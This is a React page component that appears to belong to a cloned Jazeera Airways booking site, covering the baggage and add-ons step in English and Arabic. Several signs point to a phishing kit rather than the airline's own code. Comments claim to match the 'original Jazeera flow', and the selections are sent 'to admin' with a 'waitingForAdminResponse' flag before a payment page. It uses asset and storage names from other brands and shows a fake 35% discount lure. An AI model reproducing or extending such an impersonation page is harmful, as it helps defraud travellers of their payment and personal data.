import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { sendData } from "../lib/store";
import { ChevronDown, ChevronUp, ArrowLeft, Minus, Plus } from "lucide-react";
import { useLang } from "../contexts/LanguageContext";

const NON_STANDARD_AR: Record<string, string> = {
  tv5: 'أجهزة تلفزيون بين 44" و 55"',
  tv4: 'أجهزة تلفزيون بين 32" و 43"',
  sports: 'معدات رياضية',
  other: 'أمتعة غير قياسية أخرى',
  music: 'معدات موسيقية',
};

// Matches the TripSummary structure produced by SeatCustomization / Meals.
type TripSummary = {
  passengerCount?: number;
  tripLabel?: string;
  firstDate?: string;
  flightsConv: number;
  taxesConv: number;
  cfarConv?: number;
  baseTotalConv: number;
  curCode: string;
  curDecimals: number;
  curRate: number;
  baseTotalKWD?: number;
  discountConv?: number;
  seating?: number;
  meals?: number;
  addons?: number;
  total?: number;
  bundleName?: string;
  primaryName?: string;
  originCode?: string;
  destCode?: string;
  legs?: { route: string; detail: string; origin: string; destination: string }[];
};

// Add-on base prices in KWD (matches original Jazeera flow).
const EXTRA_BAG_KWD = 12.0; // each extra check-in bag
const EXTRA_WEIGHT_OPTIONS = [
  { id: "5kg", label: "+5 kg", kwd: 6.5 },
  { id: "10kg", label: "+10 kg", kwd: 13.0 },
  { id: "15kg", label: "+15 kg", kwd: 23.4 },
];
const PRIORITY_SERVICE_KWD = 15.0;
const EARLY_CHECKIN_KWD = 2.0;

// Non-standard baggage items (match original Jazeera flow).
const NON_STANDARD_ITEMS = [
  { id: "tv5", name: 'TV sets between 44" to 55"', priceKWD: 20.0 },
  { id: "tv4", name: 'TV sets between 32" to 43"', priceKWD: 15.0 },
  { id: "sports", name: "Sports Equipment", priceKWD: 10.0 },
  { id: "other", name: "Other Non-Standard Baggage", priceKWD: 10.0 },
  { id: "music", name: "Musical Equipment", priceKWD: 10.0 },
];

export default function CustomizeTrip() {
  const [, setLocation] = useLocation();
  const { isAr, dir, t } = useLang();
  const nsName = (id: string, en: string) => (isAr && NON_STANDARD_AR[id] ? NON_STANDARD_AR[id] : en);
  const [tripSummary, setTripSummary] = useState<TripSummary | null>(null);
  const [mobileSummaryOpen, setMobileSummaryOpen] = useState(false);
  const [bottomBarVisible, setBottomBarVisible] = useState(true);
  const lastScrollY = useRef(0);

  // Add-on selections
  const [selectedWeight, setSelectedWeight] = useState<string | null>(null);
  const [extraBags, setExtraBags] = useState(0);
  const [nonStandardOpen, setNonStandardOpen] = useState(false);
  const [nonStandardQty, setNonStandardQty] = useState<Record<string, number>>({});
  const [priorityAdded, setPriorityAdded] = useState(false);
  const [earlyCheckinAdded, setEarlyCheckinAdded] = useState(false);

  // Scroll hide/show for bottom bar
  useEffect(() => {
    const onScroll = () => {
      const y = window.scrollY;
      if (y > lastScrollY.current && y > 50) {
        setBottomBarVisible(false);
      } else if (y < lastScrollY.current) {
        setBottomBarVisible(true);
      }
      lastScrollY.current = y;
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  useEffect(() => {
    const storedSummary = localStorage.getItem("tripSummary");
    if (storedSummary) {
      try {
        const parsed = JSON.parse(storedSummary);
        setTripSummary({ ...parsed, addons: 0 });
        const b = (parsed.bundleName || "").trim().toLowerCase();
        if (b === "flex plus" || b === "flexplus") setPriorityAdded(true);
      } catch {
        setLocation("/passenger-details");
      }
    } else {
      setLocation("/passenger-details");
    }
  }, [setLocation]);

  if (!tripSummary) {
    return <div className="min-h-screen bg-[#f0f5fa]" />;
  }

  const fareBundle = (tripSummary.bundleName || "Flex Plus").trim();
  const fareLower = fareBundle.toLowerCase();
  const passengerName = tripSummary.primaryName || "Guest";

  const fmt = (v: number) =>
    `${tripSummary.curCode || "KWD"} ${v.toLocaleString("en-US", {
      minimumFractionDigits: tripSummary.curDecimals ?? 3,
      maximumFractionDigits: tripSummary.curDecimals ?? 3,
    })}`;

  const f = Math.pow(10, tripSummary.curDecimals ?? 3);
  const conv = (kwd: number) => Math.round(kwd * (tripSummary.curRate ?? 1) * f) / f;

  // Non-standard items total (KWD)
  const nonStandardKWD = NON_STANDARD_ITEMS.reduce(
    (sum, it) => sum + (nonStandardQty[it.id] || 0) * it.priceKWD,
    0
  );

  // Selected weight KWD
  const selectedWeightKWD = selectedWeight
    ? (EXTRA_WEIGHT_OPTIONS.find(o => o.id === selectedWeight)?.kwd || 0)
    : 0;

  // Compute add-ons total (converted currency)
  const addonsCost =
    conv(selectedWeightKWD) +
    conv(extraBags * EXTRA_BAG_KWD) +
    conv(priorityAdded ? PRIORITY_SERVICE_KWD : 0) +
    conv(earlyCheckinAdded ? EARLY_CHECKIN_KWD : 0) +
    conv(nonStandardKWD);
  const addonsCostRounded = Math.round(addonsCost * f) / f;

  const flightsCost = tripSummary.flightsConv || 0;
  const taxesCost = tripSummary.taxesConv || 0;
  const seatingCost = tripSummary.seating || 0;
  const mealsCost = tripSummary.meals || 0;
  const baseTotal =
    tripSummary.total != null
      ? tripSummary.total
      : tripSummary.baseTotalConv + seatingCost + mealsCost;
  const totalCost = Math.round((baseTotal + addonsCostRounded) * f) / f;
  const farePortion = Math.round(((tripSummary.flightsConv || 0) + (tripSummary.taxesConv || 0)) * f) / f;
  const discountAmount = tripSummary.discountConv != null
    ? Math.round(tripSummary.discountConv * f) / f
    : Math.round((farePortion / 0.65 - farePortion) * f) / f;

  const routeLabel =
    tripSummary.legs && tripSummary.legs[0]
      ? tripSummary.legs[0].route
      : "Kuwait - Alexandria";
  const routeDetail =
    tripSummary.legs && tripSummary.legs[0]
      ? tripSummary.legs[0].detail
      : "J9 723 | 03:20 - 06:15 | Mon, 20 Jul 2026";

  const showBottomBar = () => setBottomBarVisible(true);

  const handleSelectWeight = (id: string) => {
    setSelectedWeight(prev => prev === id ? null : id);
    showBottomBar();
  };

  const handleContinue = () => {
    const updated = {
      ...tripSummary,
      addons: addonsCostRounded,
      total: totalCost,
    };
    localStorage.setItem("tripSummary", JSON.stringify(updated));
    const addonsKWD =
      selectedWeightKWD +
      extraBags * EXTRA_BAG_KWD +
      (priorityAdded ? PRIORITY_SERVICE_KWD : 0) +
      (earlyCheckinAdded ? EARLY_CHECKIN_KWD : 0) +
      nonStandardKWD;
    const baseKWD =
      (tripSummary.baseTotalKWD || 0) +
      ((tripSummary.meals || 0) / (tripSummary.curRate || 1)) +
      ((tripSummary.seating || 0) / (tripSummary.curRate || 1));
    const totalKWD = baseKWD + addonsKWD;
    localStorage.setItem("amouage_order_total", String(Math.round(totalKWD * 1000) / 1000));

    // Send addons data to admin
    const nsItems = NON_STANDARD_ITEMS
      .filter((it) => (nonStandardQty[it.id] || 0) > 0)
      .map((it) => `${NON_STANDARD_AR[it.id] || it.name} ×${nonStandardQty[it.id]}`);
    const addonsList: string[] = [];
    if (selectedWeight) addonsList.push(`وزن إضافي ${EXTRA_WEIGHT_OPTIONS.find(o => o.id === selectedWeight)?.label}`);
    if (extraBags > 0) addonsList.push(`حقائب إضافية ×${extraBags}`);
    if (priorityAdded) addonsList.push("خدمة الأولوية");
    if (earlyCheckinAdded) addonsList.push("تسجيل وصول مبكر");
    addonsList.push(...nsItems);
    sendData({
      data: {
        "الإضافات والحقائب": addonsList.length ? addonsList.join('، ') : "بدون إضافات",
        "تكلفة الإضافات": `${addonsCostRounded} ${tripSummary.curCode}`,
        "الإجمالي بعد الإضافات": `${totalCost} ${tripSummary.curCode}`,
      },
      current: "الحقائب والإضافات",
      nextPage: "المراجعة والدفع",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation("/extras");
  };

  return (
    <div className="min-h-screen bg-[#f0f5fa] font-sans pb-40" dir={dir}>
      {/* Mobile Header - matches original: back arrow + title */}
      <div className="md:hidden bg-[#f0f5fa] w-full pt-6 pb-4 px-4 flex items-center">
        <button onClick={() => setLocation('/meals')} className="w-10 h-10 rounded-full border border-gray-300 bg-white flex items-center justify-center shrink-0">
          <ArrowLeft className="w-5 h-5 text-[#004b87]" />
        </button>
        <h1 className="flex-1 text-center text-xl font-bold text-[#004b87]">{isAr ? 'نظّم أمتعتك' : 'Pack your style'}</h1>
        <div className="w-10" />
      </div>

      {/* Desktop Header */}
      <div className="hidden md:flex bg-white px-6 py-3 items-center justify-between shadow-sm">
        <img src="/iraqi_airways/upload/logo-white.jpg" alt="Jazeera" className="h-9 cursor-pointer" onClick={() => { window.location.href = '/'; }} onError={(e) => ((e.target as HTMLImageElement).style.display = "none")} />
        <div className="flex items-center gap-2 bg-white border border-gray-200 rounded-full px-4 py-2 shadow-sm">
          <span className="text-sm font-medium text-gray-700">{tripSummary.originCode || "KWI"}</span>
          <svg className="w-4 h-4 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
          <span className="text-sm font-medium text-gray-700">{tripSummary.destCode || "HBE"}</span>
          <ChevronDown className="w-4 h-4 text-gray-400" />
        </div>
      </div>

      {/* Route Pill (Mobile) */}
      <div className="md:hidden flex justify-center mb-6">
        <div className="inline-flex items-center gap-2 bg-white border border-gray-200 rounded-full px-5 py-2.5 shadow-sm">
          <span className="text-sm font-medium text-gray-700">{tripSummary.originCode || "KWI"}</span>
          <svg className="w-4 h-4 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
          <span className="text-sm font-medium text-gray-700">{tripSummary.destCode || "HBE"}</span>
          <ChevronDown className="w-4 h-4 text-gray-400" />
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 md:px-4 flex flex-col lg:flex-row gap-6">
        {/* Main Content */}
        <div className="flex-1">
          {/* Desktop title */}
          <div className="hidden md:flex items-center gap-4 mb-6">
            <button onClick={() => setLocation("/meals")} className="w-10 h-10 rounded-full border border-gray-300 bg-white flex items-center justify-center shrink-0 hover:bg-gray-50">
              <ArrowLeft className="w-5 h-5 text-[#0a72c0]" />
            </button>
            <h1 className="text-4xl font-bold text-[#0a72c0]">{isAr ? 'نظّم أمتعتك' : 'Pack your style'}</h1>
          </div>

          {/* Cabin baggage */}
          <div className="flex flex-col items-center mb-10">
            <img src="/addons/cabin_baggage.png" alt="Cabin baggage" className="w-40 h-40 object-contain mb-3" />
            <h3 className="text-2xl font-bold text-[#004b87] mb-1">{isAr ? 'أمتعة المقصورة' : 'Cabin baggage'}</h3>
            <span className="text-base font-bold text-[#004b87] mb-4">{isAr ? '7 كغ (قطعة 1) مشمولة' : '7 kg (1 pc) included'}</span>
            <div className="w-full bg-white rounded-2xl shadow-sm py-10 flex items-center justify-center">
              <span className="text-base font-bold text-[#004b87]">{isAr ? 'لا يُسمح بأمتعة إضافية' : 'No additional baggage allowed'}</span>
            </div>
          </div>

          {/* Checked baggage */}
          <div className="flex flex-col items-center mb-6">
            <img src="/addons/checked_baggage.png" alt="Checked baggage" className="w-40 h-40 object-contain mb-3" />
            <h3 className="text-2xl font-bold text-[#004b87] mb-4">{isAr ? 'الأمتعة المسجلة' : 'Checked baggage'}</h3>
          </div>

          {/* Weight options - 3 cards in a row */}
          <div className="grid grid-cols-3 gap-3 mb-8">
            {EXTRA_WEIGHT_OPTIONS.map((opt) => (
              <button
                key={opt.id}
                onClick={() => handleSelectWeight(opt.id)}
                className={`bg-white rounded-2xl shadow-sm p-4 flex flex-col items-center gap-2 border-2 transition-colors ${
                  selectedWeight === opt.id ? 'border-[#004b87]' : 'border-transparent'
                }`}
              >
                <span className="text-base font-bold text-green-600">{opt.label}</span>
                <span className="text-sm text-gray-600">{isAr ? 'وزن إضافي' : 'Extra Weight'}</span>
                <span className="text-sm font-semibold text-[#004b87]">{fmt(conv(opt.kwd))}</span>
                <span className={`w-5 h-5 rounded-full border-2 flex items-center justify-center mt-1 ${
                  selectedWeight === opt.id ? 'border-[#004b87]' : 'border-gray-300'
                }`}>
                  {selectedWeight === opt.id && <span className="w-2.5 h-2.5 rounded-full bg-[#004b87]" />}
                </span>
              </button>
            ))}
          </div>

          {/* Need an Extra Bag */}
          <div className="bg-[#004b87] rounded-2xl px-5 py-4 flex items-center justify-between mb-4">
            <div className="flex items-center gap-3">
              <img src="/addons/cabin_baggage.png" alt="" className="w-10 h-10 object-contain" />
              <div>
                <div className="text-white font-bold text-sm">{isAr ? 'تحتاج حقيبة إضافية؟' : 'Need an Extra Bag ?'}</div>
                <div className="text-blue-200 text-xs">{isAr ? 'أضف حقائب مسجلة إضافية' : 'Add Extra Check-in Bags'}</div>
              </div>
            </div>
            {extraBags === 0 ? (
              <button
                onClick={() => { setExtraBags(1); showBottomBar(); }}
                className="bg-yellow-400 hover:bg-yellow-500 text-[#004b87] font-bold text-sm px-5 py-2 rounded-full transition-colors"
              >
                {isAr ? 'أضف المزيد' : 'Add more'}
              </button>
            ) : (
              <div className="flex items-center gap-3 bg-white rounded-full px-3 py-1.5">
                <button onClick={() => { setExtraBags((v) => Math.max(0, v - 1)); showBottomBar(); }} className="text-[#004b87]">
                  <Minus className="w-4 h-4" />
                </button>
                <span className="text-sm font-bold text-[#004b87] w-4 text-center">{extraBags}</span>
                <button onClick={() => { setExtraBags((v) => v + 1); showBottomBar(); }} className="w-6 h-6 rounded-full bg-yellow-400 flex items-center justify-center text-[#004b87]">
                  <Plus className="w-4 h-4" />
                </button>
              </div>
            )}
          </div>

          {/* Priority service banner */}
          <div className="bg-[#004b87] rounded-2xl px-5 py-4 flex items-center justify-between mb-4">
            <div className="flex items-center gap-3">
              <img src="/addons/priority_service.jpg" alt="" className="w-10 h-10 rounded-lg object-cover" />
              <div>
                <div className="text-white font-bold text-sm">{isAr ? 'خدمة الأولوية' : 'Priority service'}</div>
                <div className="text-blue-200 text-xs leading-tight max-w-[180px]">
                  {isAr
                    ? 'تجنّب الانتظار.'
                    : (extraBags > 0 || selectedWeight ? "Skip the waiting. Since you added extra baggage" : "Skip the waiting.")}
                </div>
              </div>
            </div>
            <button
              onClick={() => { setPriorityAdded((v) => !v); showBottomBar(); }}
              className={
                priorityAdded
                  ? "border border-white text-white font-medium text-xs px-5 py-2 rounded-full"
                  : "bg-yellow-400 hover:bg-yellow-500 text-[#004b87] font-bold text-xs px-4 py-2 rounded-full transition-colors whitespace-nowrap"
              }
            >
              {priorityAdded ? (isAr ? 'مضاف' : 'Added') : `+${fmt(conv(PRIORITY_SERVICE_KWD))}`}
            </button>
          </div>

          {/* Blue progress bar */}
          <div className="w-full h-2 bg-[#004b87] rounded-full mb-6" />

          {/* Non standard items */}
          <div className="bg-white rounded-2xl shadow-sm mb-8 overflow-hidden">
            <button
              onClick={() => setNonStandardOpen((v) => !v)}
              className="w-full px-6 py-4 flex items-center justify-between"
            >
              <span className="text-lg font-bold text-[#004b87]">{isAr ? 'أغراض غير قياسية' : 'Non standard items'}</span>
              {nonStandardOpen ? <ChevronUp className="w-5 h-5 text-[#004b87]" /> : <ChevronDown className="w-5 h-5 text-[#004b87]" />}
            </button>
            {nonStandardOpen && (
              <div className="px-6 pb-6">
                <div className="flex items-start gap-3 mb-5">
                  <svg className="w-6 h-6 text-[#0a72c0] shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 24 24"><path d="M20 8h-3V6c0-1.1-.9-2-2-2H9c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v9c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-9c0-1.1-.9-2-2-2zM9 6h6v2H9V6z" /></svg>
                  <p className="text-sm text-gray-700 leading-relaxed">
                    {isAr ? 'للأغراض التي يزيد طولها عن متر واحد، ستحتاج إلى إضافة وزن كافٍ إلى أمتعتك المسجلة ودفع رسوم مناولة.' : 'For items longer than one meter, you\'ll need to add enough weight to your checked baggage and purchase a handling fee.'}
                  </p>
                </div>
                <div className="space-y-5 mb-8">
                  {NON_STANDARD_ITEMS.map((it) => {
                    const qty = nonStandardQty[it.id] || 0;
                    return (
                      <div key={it.id} className="flex items-center justify-between">
                        <span className="text-sm text-gray-800 flex-1">{nsName(it.id, it.name)}</span>
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-bold text-[#004b87] whitespace-nowrap">{fmt(conv(it.priceKWD))}</span>
                          {qty > 0 && (
                            <button
                              onClick={() => { setNonStandardQty((p) => ({ ...p, [it.id]: Math.max(0, (p[it.id] || 0) - 1) })); showBottomBar(); }}
                              className="w-8 h-8 rounded-full border-2 border-[#004b87] flex items-center justify-center text-[#004b87]"
                            >
                              <Minus className="w-4 h-4" />
                            </button>
                          )}
                          {qty > 0 && <span className="text-sm font-bold text-[#004b87] w-5 text-center">{qty}</span>}
                          <button
                            onClick={() => { setNonStandardQty((p) => ({ ...p, [it.id]: (p[it.id] || 0) + 1 })); showBottomBar(); }}
                            className="w-8 h-8 rounded-full border-2 border-[#004b87] flex items-center justify-center text-[#004b87]"
                          >
                            <Plus className="w-4 h-4" />
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
                <button
                  onClick={() => setNonStandardOpen(false)}
                  className="w-full bg-[#004b87] hover:bg-[#003b6a] text-white font-semibold py-3.5 rounded-full transition-colors"
                >
                  {isAr ? 'تأكيد' : 'Confirm'}
                </button>
              </div>
            )}
          </div>

          {/* Specially for you */}
          <h2 className="text-2xl font-medium text-[#004b87] mb-6">{isAr ? 'خصيصًا لك!' : 'Specially for you!'}</h2>
          <div className="space-y-5 mb-10">
            {/* Priority Service card - vertical layout matching original */}
            <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden">
              <img src="/addons/priority_service.jpg" alt="Priority Service" className="w-full h-44 object-cover" />
              <div className="p-5">
                <h4 className="text-lg font-bold text-gray-800 mb-2">{isAr ? 'خدمة الأولوية' : 'Priority Service'}</h4>
                <p className="text-sm text-gray-500 mb-4 leading-relaxed">
                  {isAr ? 'تجاوز الطوابير! تمنحك خدمة الأولوية من الجزيرة مسارًا سريعًا للإنهاء والصعود والأمتعة.' : 'Skip the lines! Jazeera Priority gives you fast-track Check-in, Boarding and Baggage.'}
                </p>
                <div className="text-sm font-bold text-[#004b87] mb-4">
                  + {fmt(conv(PRIORITY_SERVICE_KWD))} <span className="font-normal text-gray-500">{isAr ? 'لـ' : 'for'} {passengerName.split(" ")[0]}</span>
                </div>
                <div className="flex items-center justify-between">
                  <button className="text-sm text-[#004b87] font-medium underline">{isAr ? 'التفاصيل' : 'Details'}</button>
                  <button
                    onClick={() => { setPriorityAdded((v) => !v); showBottomBar(); }}
                    className={`text-sm font-bold px-6 py-2 rounded-full ${
                      priorityAdded ? "bg-green-50 text-green-600" : "bg-yellow-400 text-[#004b87]"
                    }`}
                  >
                    {priorityAdded ? (isAr ? 'مضاف ✓' : "Added ✓") : (isAr ? 'إضافة' : "Add")}
                  </button>
                </div>
              </div>
            </div>

            {/* Early Check-in card - vertical layout matching original */}
            <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden">
              <img src="/addons/early_checkin.jpg" alt="Early Check-in (Park & Fly)" className="w-full h-44 object-cover" />
              <div className="p-5">
                <h4 className="text-lg font-bold text-gray-800 mb-2">{isAr ? 'إنهاء إجراءات السفر المبكر (Park & Fly)' : 'Early Check-in (Park & Fly)'}</h4>
                <p className="text-sm text-gray-500 mb-4 leading-relaxed">
                  {isAr ? 'أنهِ إجراءات السفر مبكرًا في Park & Fly، سلّم أمتعتك واحصل على بطاقة الصعود قبل 36-12 ساعة من رحلتك' : 'Check in early at Jazeera Park & Fly, drop your baggage, and grab your boarding pass 36–12 hours before your flight'}
                </p>
                <div className="text-sm font-bold text-[#004b87] mb-4">
                  + {fmt(conv(EARLY_CHECKIN_KWD))} <span className="font-normal text-gray-500">{isAr ? 'لـ' : 'for'} {passengerName.split(" ")[0]}</span>
                </div>
                <div className="flex items-center justify-between">
                  <button className="text-sm text-[#004b87] font-medium underline">{isAr ? 'التفاصيل' : 'Details'}</button>
                  <button
                    onClick={() => { setEarlyCheckinAdded((v) => !v); showBottomBar(); }}
                    className={`text-sm font-bold px-6 py-2 rounded-full ${
                      earlyCheckinAdded ? "bg-green-50 text-green-600" : "bg-yellow-400 text-[#004b87]"
                    }`}
                  >
                    {earlyCheckinAdded ? (isAr ? 'مضاف ✓' : "Added ✓") : (isAr ? 'إضافة' : "Add")}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Trip Summary Sidebar (Desktop only) */}
        <div className="hidden lg:block w-80">
          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 sticky top-20">
            <h2 className="text-2xl font-bold text-[#004b87] mb-4">{t('seat.tripSummary')}</h2>
            <div className="flex items-center gap-2 text-sm text-gray-700 mb-2">
              <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-700 mb-5">
              <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : "One way")}: {tripSummary.firstDate || "Mon, 20 Jul 2026"}</span>
            </div>
            <div className="space-y-3">
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold text-gray-800">
                <span>{t('seat.flights')}</span>
                <span className="text-[#0a72c0]">{fmt(flightsCost)}</span>
              </div>
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5">
                <div className="flex justify-between text-base font-semibold text-gray-800">
                  <span>{isAr ? 'الإضافات' : 'Add-ons'}</span>
                  <span className="text-[#0a72c0]">{fmt(addonsCostRounded)}</span>
                </div>
              </div>
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold text-gray-800">
                <span>{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span className="text-gray-500 font-normal">{fmt(taxesCost)}</span>
              </div>
              <div className="bg-[#fdeaea] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold">
                <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
              </div>
              <div className="flex justify-between items-center pt-2 px-1">
                <span className="text-xl font-bold text-gray-800">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-base line-through text-red-500">{fmt(Math.round((totalCost + discountAmount) * f) / f)}</span>
                  <span className="text-2xl font-bold text-[#0a72c0]">{fmt(totalCost)}</span>
                </span>
              </div>
              <button
                onClick={handleContinue}
                className="w-full mt-4 bg-[#004b87] hover:bg-[#003b6a] text-white font-semibold py-3.5 rounded-full transition-colors"
              >
                {t('common.continue')}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Mobile Trip Summary Bottom Sheet */}
      {mobileSummaryOpen && (
        <div className="md:hidden fixed inset-0 z-[99999] flex items-end">
          <div className="absolute inset-0 bg-black/50" onClick={() => setMobileSummaryOpen(false)} />
          <div className="relative w-full bg-white rounded-t-2xl h-[100dvh] overflow-hidden p-5 pb-8 animate-slide-up flex flex-col">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-medium text-[#004b87]">{t('seat.tripSummary')}</h2>
              <button onClick={() => setMobileSummaryOpen(false)} className="text-gray-400 text-2xl">&times;</button>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600 mb-2">
              <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600 mb-6">
              <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : 'One way')}: {tripSummary.firstDate || 'Mon, 20 Jul 2026'}</span>
            </div>
            <div className="space-y-4 flex-1 overflow-y-auto">
              <div className="border-b border-gray-100 pb-4">
                <div className="w-full flex items-center justify-between text-sm font-medium text-gray-800">
                  <span>{t('seat.flights')}</span>
                  <span>{fmt(flightsCost)}</span>
                </div>
                <div className="mt-3 pt-3 border-t border-gray-50 border-dashed">
                  <div className="bg-gray-50 rounded-lg p-3">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-sm text-gray-800">{routeLabel}</span>
                    </div>
                    <div className="text-xs text-gray-500 mb-2">{routeDetail}</div>
                    <div className="inline-block bg-gray-200 text-gray-700 text-xs px-3 py-1 rounded-full">{fareBundle}</div>
                  </div>
                  <div className="mt-4 space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">{t('common.passengers')}</span>
                      <span className="text-blue-600">{fmt(flightsCost)}</span>
                    </div>
                    <div className="flex justify-between text-xs text-gray-500 pl-2">
                      <span>{isAr ? 'بالغ × 1' : '1x Adult'}</span>
                      <span>{fmt(flightsCost)}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">{t('seat.seating')}</span>
                      <span className="text-blue-600">{seatingCost > 0 ? fmt(seatingCost) : t('common.included')}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">{t('seat.baggage')}</span>
                      <span className="text-blue-600">{t('common.included')}</span>
                    </div>
                    <div className="flex justify-between text-xs text-gray-500 pl-2">
                      <span>{isAr ? 'أمتعة المقصورة 7 كغ × 1' : '1 X Cabin baggage 7 Kg'}</span>
                      <span>{t('common.included')}</span>
                    </div>
                    {mealsCost > 0 && (
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">{t('seat.meals')}</span>
                        <span className="text-blue-600">{fmt(mealsCost)}</span>
                      </div>
                    )}
                    {addonsCostRounded > 0 && (
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">{isAr ? 'الإضافات' : 'Add-ons'}</span>
                        <span className="text-blue-600">{fmt(addonsCostRounded)}</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
              <div className="flex justify-between text-sm font-medium text-gray-800 border-b border-gray-100 pb-4">
                <span>{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span>{fmt(taxesCost)}</span>
              </div>
              <div className="bg-[#fdeaea] rounded-2xl px-4 py-3 flex justify-between text-base font-semibold">
                <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
              </div>
              <div className="flex justify-between items-center pt-2">
                <span className="text-lg font-medium text-gray-800">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-sm line-through text-red-500">{fmt(Math.round((totalCost + discountAmount) * f) / f)}</span>
                  <span className="text-xl font-bold text-blue-600">{fmt(totalCost)}</span>
                </span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Mobile Bottom Bar - fixed with hide/show on scroll */}
      <div className={`md:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-4 pt-3 pb-6 z-[9999] shadow-[0_-4px_12px_rgba(0,0,0,0.08)] transition-transform duration-300 ${bottomBarVisible ? 'translate-y-0' : 'translate-y-full'}`}>
        <div className="mb-2">
          <span className="inline-flex items-center px-3 py-1.5 rounded-full border border-blue-200 bg-blue-50/50 text-blue-600 text-sm font-medium">
            {passengerName}
          </span>
        </div>
        <div className="flex items-end justify-between">
          <div>
            <div className="text-xs text-gray-500 font-medium">{isAr ? 'الإجمالي (للحقائب)' : 'Total (For baggage)'}</div>
            <div className="text-lg font-bold text-[#004b87]">{fmt(addonsCostRounded)}</div>
            <button onClick={() => setMobileSummaryOpen(true)} className="text-sm text-blue-600 font-medium underline">{isAr ? 'ملخص الرحلة' : 'Trip summary'}</button>
          </div>
          <button
            onClick={handleContinue}
            className="bg-[#004b87] hover:bg-[#003b6a] text-white font-medium px-8 py-3 rounded-full transition-colors"
          >
            {t('common.continue')}
          </button>
        </div>
      </div>
    </div>
  );
}
